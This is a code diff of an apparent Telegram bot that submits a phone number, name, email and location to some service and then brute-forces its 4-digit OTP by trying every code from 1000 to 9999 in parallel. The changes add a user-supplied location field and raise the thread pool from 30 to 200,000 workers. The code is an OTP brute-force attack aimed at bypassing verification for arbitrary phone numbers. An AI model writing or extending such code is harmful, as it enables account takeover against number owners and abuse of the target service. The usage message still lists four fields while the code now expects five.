@@ -36,7 +36,7 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.message.chat_id
 
     try:
-        ask_me, mobile_number, ask_name, ask_email = map(str.strip, message.split(" - "))
+        ask_me, mobile_number, ask_name, ask_email, ask_loc = map(str.strip, message.split(" - "))
     except ValueError:
         await update.message.reply_text("❌ Invalid format! Use: `book-name - number - name - email`", parse_mode="Markdown")
         return
@@ -71,7 +71,7 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "country_code": "+91",
             "mobile_number": mobile_number,
             "location": 64,
-            "current_location": "Pune, Maharashtra, India",
+            "current_location": ask_loc,
             "email": ask_email,
             "education_level": 12,
             "name": ask_name,
@@ -131,7 +131,7 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     async def check_otp_with_updates():
         nonlocal found_otp, checked_otps
-        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=200000) as executor:
             future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
 
             for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
